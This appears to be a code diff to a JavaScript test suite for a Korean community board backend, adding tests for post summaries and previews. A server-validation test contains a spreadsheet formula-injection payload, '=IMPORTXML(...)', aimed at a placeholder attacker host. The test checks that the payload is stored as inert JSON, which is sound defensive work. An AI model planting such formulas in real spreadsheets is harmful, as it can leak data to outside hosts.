@@ -58,6 +58,27 @@ test('members cannot approve themselves or publish notices',()=>{
 test('post retries are idempotent, private payloads do not expose emails',()=>{
   const s=server(),a=s.login();s.approve(a.member.id);const d=draft(),p=s.call('createPost',d,a.session).post;assert.equal(s.call('createPost',d,a.session).post.id,p.id);const list=s.call('listPosts',{},a.session);assert.equal(list.total,1);assert.equal(JSON.stringify(list).includes('a@example.org'),false);assert.equal(list.posts[0].body,undefined);
 });
+test('optional summaries use the body preview without saving generated text',()=>{
+  const s=server(),a=s.login();
+  const p=s.call('createPost',{...draft(),summary:'  ',body:'첫 줄입니다.\n\n다음 줄입니다.'},a.session).post;
+  assert.equal(p.summary,'');
+  assert.equal(s.call('listPosts').posts[0].summary,'첫 줄입니다. 다음 줄입니다.');
+  assert.equal(s.call('getPost',{id:p.id}).post.summary,'');
+  assert.equal(s.context.find_('Posts',p.id).summary,'');
+  const updated=s.call('updatePost',{...draft(),id:p.id,version:p.version,summary:'',body:'새로운 본문'},a.session).post;
+  assert.equal(s.call('listPosts').posts[0].summary,'새로운 본문');
+  s.call('updatePost',{...draft(),id:p.id,version:updated.version,summary:'직접 쓴 요약',body:'다른 본문'},a.session);
+  assert.equal(s.call('listPosts').posts[0].summary,'직접 쓴 요약');
+});
+test('missing text leaves a blank preview and long body previews are bounded',()=>{
+  const s=server(),a=s.login();
+  const p=s.call('createPost',{...draft(),summary:undefined,body:undefined},a.session).post;
+  assert.equal(s.call('listPosts').posts[0].summary,'');
+  assert.equal(p.body,'');
+  s.call('updatePost',{...draft(),id:p.id,version:p.version,summary:'',body:'가'.repeat(400)},a.session);
+  assert.equal(s.call('listPosts').posts[0].summary,'가'.repeat(300));
+  for(const summary of [null,42,{},'가'.repeat(301)])denied(()=>s.call('createPost',{...draft(),summary},a.session),'INVALID');
+});
 test('likes toggle once per member, expose only count publicly, and retain an audit row while liked',()=>{
   const s=server(),a=s.login();const p=s.call('createPost',draft(),a.session).post;
   let like=s.call('toggleLike',{postId:p.id},a.session);assert.equal(like.liked,true);assert.equal(like.likeCount,1);
@@ -83,7 +104,7 @@ test('comments enforce author rights and deleted parent hides all comments',()=>
   const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const d={postId:p.id,body:'댓글입니다',mutationId:randomUUID()};const c=s.call('createComment',d,a.session).comment;assert.equal(s.call('createComment',d,a.session).comment.id,c.id);const b=s.login('b','b@example.org');s.approve(b.member.id);denied(()=>s.call('updateComment',{id:c.id,version:1,body:'남의 댓글 수정'},b.session),'FORBIDDEN');s.call('deletePost',{id:p.id,version:1},a.session);denied(()=>s.call('getPost',{id:p.id},a.session),'NOT_FOUND');denied(()=>s.call('createComment',{...d,mutationId:randomUUID()},a.session),'NOT_FOUND');
 });
 test('server rejects oversized and blank content and stores formulas as JSON text',()=>{
-  const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('createPost',{...draft(),title:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),summary:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),body:'a'.repeat(10001)},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'unsafe.pdf',mimeType:'application/pdf',size:1},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'large.mp4',mimeType:'video/mp4',size:100*1024*1024+1},a.session),'INVALID');s.call('createPost',{...draft(),body:'=IMPORTXML("https://attacker.invalid","x")'},a.session);assert.equal(s.db.Posts[1][1][0],'{');
+  const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('createPost',{...draft(),title:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),body:'a'.repeat(10001)},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'unsafe.pdf',mimeType:'application/pdf',size:1},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'large.mp4',mimeType:'video/mp4',size:100*1024*1024+1},a.session),'INVALID');s.call('createPost',{...draft(),body:'=IMPORTXML("https://attacker.invalid","x")'},a.session);assert.equal(s.db.Posts[1][1][0],'{');
 });
 test('admin approval and immediate blocking revoke write access while public reading remains available',()=>{
   const s=server(),a=s.login(),admin=s.login('admin-sub','admin@example.org');assert.equal(admin.member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'approved'},admin.session);assert.equal(s.call('me',{},a.session).member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'blocked'},admin.session);assert.equal(s.call('listPosts',{},a.session).total,0);denied(()=>s.call('createPost',draft(),a.session),'AUTH');
